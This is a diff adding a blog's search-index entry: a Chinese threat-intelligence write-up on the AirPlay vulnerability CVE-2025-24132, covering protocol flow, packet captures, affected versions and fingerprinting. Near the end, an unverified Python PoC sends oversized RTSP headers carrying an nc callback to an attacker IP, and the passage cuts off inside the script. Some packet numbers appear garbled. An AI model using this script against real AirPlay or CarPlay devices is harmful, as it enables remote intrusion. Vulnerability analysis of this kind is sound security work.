@@ -1,6 +1,162 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>CVE-2025-24132威胁情报分析</title>
+    <url>/CVE-2025-24132.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>
+
+<h1 id="威胁情报"><a href="#威胁情报" class="headerlink" title="威胁情报"></a>威胁情报</h1><blockquote>
+<ol>
+<li>以色列网络安全公司“Oligo”披露了AirPlay协议中存在的一组漏洞，命名为 “AirBorne” 。其中值得关注的有两个：CVE-2025-24132、CVE-2025-24252。</li>
+<li>参考文章<ul>
+<li><a href="https://zhuanlan.zhihu.com/p/683643576">深入解析RTSP协议：流媒体传输的控制核心 - 知乎</a></li>
+<li><a href="https://fingergit.github.io/Unofficial-AirPlay-Protocol-Specification/AirPlay.html">AirPlay协议规范（非官方）</a></li>
+<li><a href="https://wenku.csdn.net/column/159v2uiruj#3.1%20Airplay">https://wenku.csdn.net/column/159v2uiruj#3.1%20Airplay</a></li>
+<li><a href="https://blog.csdn.net/weixin_30481539/article/details/151272328">AirPlay协议源码分析与协议详解-CSDN博客</a></li>
+</ul>
+</li>
+</ol>
+</blockquote>
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>Airplay是苹果公司推出的一套基于以太网通信的远程音视频播放协议，用来远程播放音频、视屏等等（比如iPhone上的屏幕镜像功能、直播投屏）利用现有的TCP&#x2F;IP协议栈，增加了一些功能，包括从设备的发现 -&gt; 设备连接 -&gt; 音频&#x2F;视频流数据的传输。Airplay协议到目前（2025年）基本上历经了2个版本，在版本一中主要采用RTSP协议相TCP&#x2F;7000传输控制命令，而版本二中，主要采用HTTP协议向TCP&#x2F;7000传递命令；并且，在airplay2.x版本中，加上了TLS等加密和认证的手段，对传递的内容进行到了加密处理。Airpaly的实现采用C&#x2F;S架构，下面以iPhone作为Client、支持Apple TV作为Server进行讲述。</p>
+<table>
+<thead>
+<tr>
+<th>协议</th>
+<th>端口</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>UDP（mDNS&#x2F;Bonjour）</td>
+<td>5353</td>
+<td>发现局域网中的Airplay客户端和服务端</td>
+</tr>
+<tr>
+<td>TCP</td>
+<td>7000</td>
+<td>传输控制相关的命令（RTSP或者HTTP格式）</td>
+</tr>
+<tr>
+<td>TCP</td>
+<td>7100</td>
+<td>传输镜像数据（投屏）</td>
+</tr>
+<tr>
+<td>UDP</td>
+<td>6000&#x2F;6001</td>
+<td>传输RTP音频数据</td>
+</tr>
+</tbody></table>
+<h3 id="通信过程描述"><a href="#通信过程描述" class="headerlink" title="通信过程描述"></a>通信过程描述</h3><ol>
+<li><p>mDNS查询：iPhone利用mDNS(又叫做Bonjour)协议，发现周围支持airplay协议的设备</p>
+<ul>
+<li><p>iPhone通过udp5353端口，向多播地址224.0.0.251发起广播，寻找可用的airplay server</p>
+  <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">以太网层:</span><br><span class="line">  源MAC: aa:bb:cc:dd:ee:ff (iPhone)</span><br><span class="line">  目标MAC: 01:00:5E:00:00:FB (组播地址)</span><br><span class="line"></span><br><span class="line">IP层:</span><br><span class="line">  源IP: 192.168.1.100</span><br><span class="line">  目标IP: 224.0.0.251 (mDNS组播地址)</span><br><span class="line">  协议: UDP</span><br><span class="line"></span><br><span class="line">UDP层:</span><br><span class="line">  源端口: 5353</span><br><span class="line">  目标端口: 5353</span><br><span class="line"></span><br><span class="line">应用层 (mDNS):</span><br><span class="line">  查询类型: PTR</span><br><span class="line">  查询名称: _airplay._tcp.local</span><br><span class="line">  含义: &quot;谁支持 AirPlay 服务？&quot;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>设备进行单播响应（其实airplay server也会不停地向外发起广播，发送自己的设备信息）</p>
+  <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">以太网层:</span><br><span class="line">  源MAC: 11:22:33:44:55:66 (Apple TV)</span><br><span class="line">  目标MAC: aa:bb:cc:dd:ee:ff (iPhone)</span><br><span class="line"></span><br><span class="line">IP层:</span><br><span class="line">  源IP: 192.168.1.200</span><br><span class="line">  目标IP: 192.168.1.100 (单播回复)</span><br><span class="line">  协议: UDP</span><br><span class="line"></span><br><span class="line">UDP层:</span><br><span class="line">  源端口: 5353</span><br><span class="line">  目标端口: 5353</span><br><span class="line"></span><br><span class="line">应用层 (mDNS):</span><br><span class="line">  响应类型: PTR</span><br><span class="line">  服务名称: Living Room Apple TV._airplay._tcp.local</span><br><span class="line">  IP地址: 192.168.1.200</span><br><span class="line">  端口: 7000</span><br><span class="line">  TXT记录: </span><br><span class="line">    - model=AppleTV6,2</span><br><span class="line">    - features=0x4A7FDFD5</span><br><span class="line">    - srcvers=220.68</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>TCP三次握手，Server的7000端口上建立连接（<strong>苹果的协议家族里面，会在TCP&#x2F;7000端口上面交互双方的设备信息&#x2F;控制命令等等，然后在其他端口上面传输实际的通信数据</strong>）</p>
+ <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">以太网层:</span><br><span class="line">  源MAC: aa:bb:cc:dd:ee:ff</span><br><span class="line">  目标MAC: 11:22:33:44:55:66</span><br><span class="line"></span><br><span class="line">IP层:</span><br><span class="line">  源IP: 192.168.1.100</span><br><span class="line">  目标IP: 192.168.1.200</span><br><span class="line"></span><br><span class="line">TCP层:</span><br><span class="line">  源端口: 54321</span><br><span class="line">  目标端口: 7000</span><br><span class="line">  标志位: SYN</span><br><span class="line">  序列号: 1000</span><br></pre></td></tr></table></figure>
+
+ <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">TCP层:</span><br><span class="line">  源端口: 7000</span><br><span class="line">  目标端口: 54321</span><br><span class="line">  标志位: SYN+ACK</span><br><span class="line">  序列号: 2000</span><br><span class="line">  确认号: 1001</span><br></pre></td></tr></table></figure>
+
+ <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">TCP层:</span><br><span class="line">  源端口: 543213  </span><br><span class="line">  目标端口: 70004  </span><br><span class="line">  标志位: ACK5  </span><br><span class="line">  确认号: 2001</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>AirPlay协议握手：用来控制多媒体对话，控制暂停、播放、传输格式等方面。</p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251120170134581.png" alt="image-20251120170134581"></p>
+<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251120165749893.png" alt="image-20251120165749893"></p>
+<ul>
+<li><p>iPhone发起RSTP OPTIONS请求（主要是用来查询Server支持什么样的命令传输方式）</p>
+  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TCP连接: 192.168.1.100:54321 → 192.168.1.200:7000</span><br><span class="line"></span><br><span class="line">应用层数据:</span><br><span class="line">OPTIONS * RTSP/1.0</span><br><span class="line">CSeq: 1</span><br><span class="line">User-Agent: AirPlay/220.68</span><br><span class="line">Client-Instance: FBED9A-6539-4E15-B95A-37A6D88</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Apple TV回复RSTP OPTIONS响应</p>
+  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RTSP/1.0 200 OK</span><br><span class="line">CSeq: 1</span><br><span class="line">Public: SETUP, RECORD, PAUSE, FLUSH, TEARDOWN, OPTIONS, </span><br><span class="line">        GET_PARAMETER, SET_PARAMETER, POST, GET</span><br><span class="line">Server: AirTunes/220.68</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>iPhone发起RSTP SETUP，请求建立媒体流</p>
+  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SETUP rtsp://192.168.1.200/stream RTSP/1.0</span><br><span class="line">CSeq: 2</span><br><span class="line">Transport: RTP/AVP/UDP;unicast;mode=record;control_port=6001;timing_port=6002</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>后续步骤省略……</p>
+</li>
+</ul>
+</li>
+<li><p>传输音频&#x2F;视频的二进制数据</p>
+<ul>
+<li><p>通过RTP传输音频数据</p>
+  <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">IP层:</span><br><span class="line">  源IP: 192.168.1.100</span><br><span class="line">  目标IP: 192.168.1.200</span><br><span class="line">  协议: UDP</span><br><span class="line"></span><br><span class="line">UDP层:</span><br><span class="line">  源端口: 随机</span><br><span class="line">  目标端口: 6000</span><br><span class="line"></span><br><span class="line">应用层 (RTP):</span><br><span class="line">  版本: 2</span><br><span class="line">  载荷类型: 96 (动态)</span><br><span class="line">  序列号: 12345</span><br><span class="line">  时间戳: 160000</span><br><span class="line">  同步源标识: 0xABCDEF12</span><br><span class="line">  载荷数据: [AAC编码的音频数据]</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>后续步骤省略……</p>
+</li>
+</ul>
+</li>
+</ol>
+<h3 id="wireshark抓包"><a href="#wireshark抓包" class="headerlink" title="wireshark抓包"></a>wireshark抓包</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">==========================================================</span><br><span class="line">||	Client                                              ||</span><br><span class="line">||		- device: iphone                                ||</span><br><span class="line">||		- ipv4: 172.20.10.1                             ||</span><br><span class="line">||		- MAC: c6:ac:aa:16:d4:64                        ||</span><br><span class="line">||		- ipv6: 2408:8440:b500:a13:e96e:515:63c1:f416   ||</span><br><span class="line">||	                                                    ||</span><br><span class="line">||	Server                                              ||</span><br><span class="line">||		- device: Airserver for windows 5.7.2.0         ||</span><br><span class="line">||		- ipv4: 172.20.10.6                             ||</span><br><span class="line">||		- MAC: e0:0a:f6:a6:48:c7                        ||</span><br><span class="line">||		- ipv6: 2408:8440:b500:a13:94d9:8df9:f144:e718  || </span><br><span class="line">==========================================================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= mDNS查询 =======================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= TCP三次握手 =======================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= iPhone to Server ======================= </span><br><span class="line">GET /info RTSP/1.0</span><br><span class="line">X-Apple-ProtocolVersion: 1</span><br><span class="line">Content-Length: 70</span><br><span class="line">Content-Type: application/x-apple-binary-plist</span><br><span class="line">CSeq: 0</span><br><span class="line">DACP-ID: BE07BFBF729D3251</span><br><span class="line">Active-Remote: 3763168353</span><br><span class="line">User-Agent: AirPlay/925.3.2</span><br><span class="line"></span><br><span class="line">bplist00YqualifierZtxtAirPlay</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= Server to iPhone ======================= </span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Fri, 21 Nov 2025 09:20:01 GMT</span><br><span class="line">Content-Type: application/x-apple-binary-plist</span><br><span class="line">Content-Length: 210</span><br><span class="line"></span><br><span class="line">bplist00</span><br><span class="line">	</span><br><span class="line">_E1:0A:F6:A6:48:C7XdeviceIDR&#125;_XfeaturesQ4[statusFlagsZAppleTV3,2UmodelQ2RvvV220.68]sourceVersionSAPTTname_audioInputFormats/8=FHT_egjqpdateC</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= iPhone to Server ======================= </span><br><span class="line">POST /fp-setup RTSP/1.0</span><br><span class="line">X-Apple-ET: 32</span><br><span class="line">Content-Length: 16</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">CSeq: 1</span><br><span class="line">DACP-ID: BE07BFBF729D3251</span><br><span class="line">Active-Remote: 3763168353</span><br><span class="line">User-Agent: AirPlay/925.3.2</span><br><span class="line"></span><br><span class="line">FPLY</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= Server to iPhone =======================</span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">CSeq: 1</span><br><span class="line">Content-Length: 142</span><br><span class="line"></span><br><span class="line">FPLYqA</span><br><span class="line">e&#x27;sQhw-?&gt;INNO`Lnz@IM8Rec$Xn]\cZcdG</span><br><span class="line">Xy-2Sh;g</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= iPhone to Server =======================</span><br><span class="line">POST /fp-setup RTSP/1.0</span><br><span class="line">X-Apple-ET: 32</span><br><span class="line">Content-Length: 164</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">CSeq: 2</span><br><span class="line">DACP-ID: BE07BFBF729D3251</span><br><span class="line">Active-Remote: 3763168353</span><br><span class="line">User-Agent: AirPlay/925.3.2</span><br><span class="line"></span><br><span class="line">FPLY$e2(&#125;^g=4W;2As]A2yT0 K(UUHVK4XL</span><br><span class="line">=m	LV7-@mQv&amp;~+/3c),QKg2Zr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= Server to iPhone =======================</span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">CSeq: 2</span><br><span class="line">Content-Length: 32</span><br><span class="line"></span><br><span class="line">FPLY),QKg2Zr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= iPhone to Server =======================</span><br><span class="line">SETUP rtsp://2408:8440:b500:a13:94d9:8df9:f144:e718/14765125222558812197 RTSP/1.0</span><br><span class="line">Content-Length: 658</span><br><span class="line">Content-Type: application/x-apple-binary-plist</span><br><span class="line">CSeq: 3</span><br><span class="line">DACP-ID: BE07BFBF729D3251</span><br><span class="line">Active-Remote: 3763168353</span><br><span class="line">User-Agent: AirPlay/925.3.2</span><br><span class="line"></span><br><span class="line">bplist00	</span><br><span class="line"></span><br><span class="line"> !&quot;#$Ret_updateSessionRequestSeiv[sessionUUID_statsCollectionEnabledVosName^timingProtocol^osBuildVersion]sourceVersionZtimingPort_isScreenMirroringSessionYosVersionTekey_sessionCorrelationUUIDXdeviceIDUmodelTnameZmacAddress O~jHyfgd&#x27;_$CCE84329-32C7-4825-842A-F352FA3554C9YiPhone OSSNTPX23C5027fW925.3.2O	T26.2OHFPLY&lt; NV&#x27;YbbIx;5RQP_$41C6E7A1-FC63-49CE-884A-A1AB9358308E_BA:7E:91:22:2A:CBZiPhone15,3e^eO`i_C6:AC:AA:16:D4:64/2IMYry(OPZ^gorsx	%(</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= Server to iPhone =======================</span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">Content-Type: application/x-apple-binary-plist</span><br><span class="line">Content-Length: 77</span><br><span class="line">CSeq: 3</span><br><span class="line">Server: AirTunes/220.68</span><br><span class="line"></span><br><span class="line">bplist00YeventPort|ZtimingPort</span><br><span class="line">:Th(</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= iPhone to Server =======================</span><br><span class="line">GET /info RTSP/1.0</span><br><span class="line">X-Apple-ProtocolVersion: 1</span><br><span class="line">CSeq: 4</span><br><span class="line">DACP-ID: BE07BFBF729D3251</span><br><span class="line">Active-Remote: 3763168353</span><br><span class="line">User-Agent: AirPlay/925.3.2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= Server to iPhone =======================</span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">Content-Type: application/x-apple-binary-plist</span><br><span class="line">Content-Length: 821</span><br><span class="line">CSeq: 4</span><br><span class="line">Server: AirTunes/220.68</span><br><span class="line"></span><br><span class="line">bplist00#$&amp;()+-.0:&lt;=%&#x27;</span><br><span class="line">*,</span><br><span class="line">/1;/R&#125;_XfeaturesSAPTTname	</span><br><span class="line">Xdisplays]widthPhysical	XrotationUwidth[widthPixels^heightPhysical8Vheight[overscanned\heightPixels_$4DA963C0-AA8F-4462-8EA9-694BC8B927C4Tuuid!dTtype_audioInputFormats_audioOutputFormats e&quot;f\audioFormatsRpiRvv[statusFlags_keepAliveLowPowerV220.68]sourceVersion_@355ce7d9bda3a97b18b91754287a2b26a680d64a56239a6ba8f813dd26415cc0Rpk_keepAliveSendStatsAsBody_E0:0A:F6:A6:48:C7XdeviceID2783564_outputLatencyMicrosWdefaultYaudioType_inputLatencyMicros356 4356&quot;9Umedia^audioLatenciesZAppleTV3,2UmodelZmacAddress).7;@BW`bpqz&#125;079@BORTWYey/7AV_hn&#125;:Th&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= iPhone to Server =======================</span><br><span class="line">GET_PARAMETER rtsp://2408:8440:b500:a13:94d9:8df9:f144:e718/14765125222558812197 RTSP/1.0</span><br><span class="line">Content-Length: 8</span><br><span class="line">Content-Type: text/parameters</span><br><span class="line">CSeq: 5</span><br><span class="line">DACP-ID: BE07BFBF729D3251</span><br><span class="line">Active-Remote: 3763168353</span><br><span class="line">User-Agent: AirPlay/925.3.2</span><br><span class="line"></span><br><span class="line">volume</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= Server to iPhone =======================</span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">Server: AirTunes/220.68</span><br><span class="line">CSeq: 5</span><br><span class="line">Content-Type: text/parameters</span><br><span class="line">Content-Length: 19</span><br><span class="line"></span><br><span class="line">volume: -0.000000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= iPhone to Server =======================</span><br><span class="line">RECORD rtsp://2408:8440:b500:a13:94d9:8df9:f144:e718/14765125222558812197 RTSP/1.0</span><br><span class="line">CSeq: 6</span><br><span class="line">DACP-ID: BE07BFBF729D3251</span><br><span class="line">Active-Remote: 3763168353</span><br><span class="line">User-Agent: AirPlay/925.3.2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= Server to iPhone =======================</span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">Audio-Latency: 0</span><br><span class="line">Server: AirTunes/220.68</span><br><span class="line">CSeq: 6</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= iPhone to Server =======================</span><br><span class="line">SETUP rtsp://2408:8440:b500:a13:94d9:8df9:f144:e718/14765125222558812197 RTSP/1.0</span><br><span class="line">Content-Length: 204</span><br><span class="line">Content-Type: application/x-apple-binary-plist</span><br><span class="line">CSeq: 7</span><br><span class="line">DACP-ID: BE07BFBF729D3251</span><br><span class="line">Active-Remote: 3763168353</span><br><span class="line">User-Agent: AirPlay/925.3.2</span><br><span class="line"></span><br><span class="line">bplist00Wstreams]timestampInfoYlatencyMsTtype_streamConnectionID	</span><br><span class="line">TnameUSubSu</span><br><span class="line"></span><br><span class="line">UBePxT</span><br><span class="line">UAfPxT</span><br><span class="line">UBefEn</span><br><span class="line">UEmEncKn@9,6;PVY^dgmpvy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= Server to iPhone =======================</span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">Content-Type: application/x-apple-binary-plist</span><br><span class="line">Content-Length: 85</span><br><span class="line">CSeq: 7</span><br><span class="line">Server: AirTunes/220.68</span><br><span class="line"></span><br><span class="line">bplist00WstreamsnTtypeXdataPort</span><br><span class="line">!$238-</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= iPhone to Server =======================</span><br><span class="line">7100端口传输媒体数据</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= iPhone to Server =======================</span><br><span class="line">TEARDOWN rtsp://2408:8440:b500:a13:94d9:8df9:f144:e718/14765125222558812197 RTSP/1.0</span><br><span class="line">Content-Length: 69</span><br><span class="line">Content-Type: application/x-apple-binary-plist</span><br><span class="line">CSeq: 58</span><br><span class="line">DACP-ID: BE07BFBF729D3251</span><br><span class="line">Active-Remote: 3763168353</span><br><span class="line">User-Agent: AirPlay/925.3.2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= Server to iPhone =======================</span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">Server: AirTunes/220.68</span><br><span class="line">CSeq: 58</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bplist00WstreamsTtypen</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= iPhone to Server =======================</span><br><span class="line">TEARDOWN rtsp://2408:8440:b500:a13:94d9:8df9:f144:e718/14765125222558812197 RTSP/1.0</span><br><span class="line">Content-Length: 42</span><br><span class="line">Content-Type: application/x-apple-binary-plist</span><br><span class="line">CSeq: 59</span><br><span class="line">DACP-ID: BE07BFBF729D3251</span><br><span class="line">Active-Remote: 3763168353</span><br><span class="line">User-Agent: AirPlay/925.3.2</span><br><span class="line"></span><br><span class="line">bplist00</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= Server to iPhone =======================</span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">Server: AirTunes/220.68</span><br><span class="line">CSeq: 59</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">======================= TCP四次挥手 =======================</span><br></pre></td></tr></table></figure>
+
+<h2 id="CVE-2025-24132"><a href="#CVE-2025-24132" class="headerlink" title="CVE-2025-24132"></a>CVE-2025-24132</h2><ol>
+<li><p>CVE-2025-24132 漏洞的成因是基于栈的缓冲区溢出（stack-based buffer overflow），出现在Apple AirPlay SDK 处理网络数据包的代码路径中。漏洞位于AirPlay SDK的网络数据解析模块中，具体是在处理来自本地网络的AirPlay协议数据包时，未能正确验证输入数据的长度，导致栈缓冲区被溢出覆盖。需要测试人员和目标系统位于同一个局域网（能够相互通信就好）。迄今为止（2025年11月25日），没能找到可以成功复现漏洞的PoC以及exp，YouTuBe上面该漏洞的提交者演示了利用过程，但仍然没有公开PoC。</p>
+</li>
+<li><p>影响的范围</p>
+<ul>
+<li>Airplay 音频SDK：&lt;2.7.1</li>
+<li>Airplay 视频SDK：&lt;3.6.0</li>
+<li>Carplay通信SDK：&lt;R18.1</li>
+</ul>
+</li>
+<li><p>为什么Carplay会受到影响</p>
+<ul>
+<li>Carplay的无线通信机制底层依赖AirPlay协议栈，内部集成了AirPlay SDK，而该漏洞位于AirPlay SDK的网络数据解析模块中；</li>
+<li>利用CVE-2025-24132攻击Carplay：通过iAP2协议连接上车机并自动交互WiFi凭证（蓝牙链路） -&gt; 脚本攻击（WiFi链路）</li>
+</ul>
+</li>
+<li><p>网络嗅探分析版本</p>
+<ul>
+<li>wireshark抓取7000端口的流量：tcp.port&#x3D;&#x3D;7000</li>
+<li>找到发往tcp&#x2F;7000的数据包，在User-Agent字段中大概率会出现“Airplay&#x2F;xx.xx.xx”的协议版本号（非标准软件可能会进行修改）</li>
+</ul>
+</li>
+<li><p>airplay协议版本&amp;airplay SDK对应关系</p>
+<table>
+<thead>
+<tr>
+<th>协议版本（抓包 User-Agent）</th>
+<th>SDK 版本（MFi 内部）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>AirPlay&#x2F;210.x</td>
+<td>AirPlay Audio SDK &lt; 2.7.1</td>
+</tr>
+<tr>
+<td>AirPlay&#x2F;220.x</td>
+<td>AirPlay Audio SDK ≥ 2.7.1</td>
+</tr>
+<tr>
+<td>AirPlay&#x2F;310.x</td>
+<td>AirPlay Video SDK &lt; 3.6.0.126</td>
+</tr>
+<tr>
+<td>AirPlay&#x2F;320.x</td>
+<td>AirPlay Video SDK ≥ 3.6.0.126</td>
+</tr>
+<tr>
+<td>AirPlay&#x2F;420.x</td>
+<td>AirPlay Video SDK 3.8+</td>
+</tr>
+</tbody></table>
+</li>
+<li><p>PoC样例（未能找到合适的目标验证有效性，仅作参考）</p>
+ <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">A PoC script for CVE-2025-24132 is made by shaoxinSEC 25/11/2025.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> ifaddr</span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os, sys, socket, time, ipaddress</span><br><span class="line"><span class="keyword">from</span> zeroconf <span class="keyword">import</span> Zeroconf, ServiceBrowser, ServiceInfo</span><br><span class="line"></span><br><span class="line"><span class="comment"># --------- 配置 ----------</span></span><br><span class="line">OVERFLOW_SIZES = [<span class="number">0x1200</span>, <span class="number">0x2000</span>]   <span class="comment"># 4608 &amp; 8192</span></span><br><span class="line">LISTEN_ADDR = <span class="string">&quot;172.20.10.6&quot;</span>         <span class="comment"># 攻击机IP（尝试nc外带命令）</span></span><br><span class="line">LISTEN_PORT    = <span class="number">4445</span>               <span class="comment"># 攻击机PORT</span></span><br><span class="line">TIMEOUT        = <span class="number">3</span></span><br><span class="line"><span class="comment"># -------------------------</span></span><br><span class="line"></span><br><span class="line">airplay_devices = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AirPlayListener</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">remove_service</span>(<span class="params">self, zc, type_, name</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add_service</span>(<span class="params">self, zc, type_, name</span>):</span><br><span class="line">        info = zc.get_service_info(type_, name)</span><br><span class="line">        <span class="keyword">if</span> info:</span><br><span class="line">            addr  = socket.inet_ntoa(info.addresses[<span class="number">0</span>])</span><br><span class="line">            port  = info.port</span><br><span class="line">            props = &#123;k.decode().lower(): v.decode() <span class="keyword">for</span> k, v <span class="keyword">in</span> info.properties.items()&#125;</span><br><span class="line">            airplay_devices.append(&#123;</span><br><span class="line">                <span class="string">&#x27;name&#x27;</span>: name.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>],</span><br><span class="line">                <span class="string">&#x27;ip&#x27;</span>: addr,</span><br><span class="line">                <span class="string">&#x27;port&#x27;</span>: port,</span><br><span class="line">                <span class="string">&#x27;model&#x27;</span>: props.get(<span class="string">&#x27;model&#x27;</span>, <span class="string">&#x27;Unknown&#x27;</span>),</span><br><span class="line">                <span class="string">&#x27;features&#x27;</span>: props.get(<span class="string">&#x27;features&#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">            &#125;)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">update_service</span>(<span class="params">self, zc, type_, name</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_port</span>(<span class="params">ip, port, timeout=<span class="number">2</span></span>):</span><br><span class="line">    <span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> s:</span><br><span class="line">        s.settimeout(timeout)</span><br><span class="line">        <span class="keyword">return</span> s.connect_ex((ip, port)) == <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crash_target</span>(<span class="params">ip, port, size</span>):</span><br><span class="line">    cmd  = <span class="string">f&quot;echo CVE-2025-24132|nc <span class="subst">&#123;LISTEN_ADDR&#125;</span> <span class="subst">&#123;LISTEN_PORT&#125;</span>\n&quot;</span></span><br><span class="line">    pkt = (</span><br><span class="line">        <span class="string">f&quot;SETUP rtsp://<span class="subst">&#123;ip&#125;</span>/airplay RTSP/1.0\r\n&quot;</span></span><br><span class="line">        <span class="string">f&quot;CSeq: 1\r\n&quot;</span></span><br><span class="line">        <span class="string">f&quot;Session-ID: <span class="subst">&#123;<span class="string">&#x27;A&#x27;</span>*size&#125;</span>\r\n&quot;</span></span><br><span class="line">        <span class="string">f&quot;Authorization: Basic <span class="subst">&#123;<span class="string">&#x27;B&#x27;</span>*<span class="number">0x400</span>&#125;</span>\r\n&quot;</span></span><br><span class="line">        <span class="string">f&quot;User-Agent: AirPlay/310.17 &quot;</span> + cmd + <span class="string">&quot;\r\n\r\n&quot;</span></span><br><span class="line">    ).encode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> s:</span><br><span class="line">            s.settimeout(TIMEOUT)</span><br><span class="line">            s.connect((ip, port))</span><br><span class="line">            s.send(pkt)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">heur_vuln</span>(<span class="params">model, features</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;旧model或低特征位 =&gt; 可能旧SDK&quot;&quot;&quot;</span></span><br><span class="line">    vuln_models = [<span class="string">&#x27;AppleTV2,1&#x27;</span>, <span class="string">&#x27;AirPort10,115&#x27;</span>, <span class="string">&#x27;CarPlay1,1&#x27;</span>, <span class="string">&#x27;Audio2,1&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(m <span class="keyword">in</span> model <span class="keyword">for</span> m <span class="keyword">in</span> vuln_models): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(features, <span class="number">16</span>) &amp; <span class="number">0xFF</span> == <span class="number">0</span>: <span 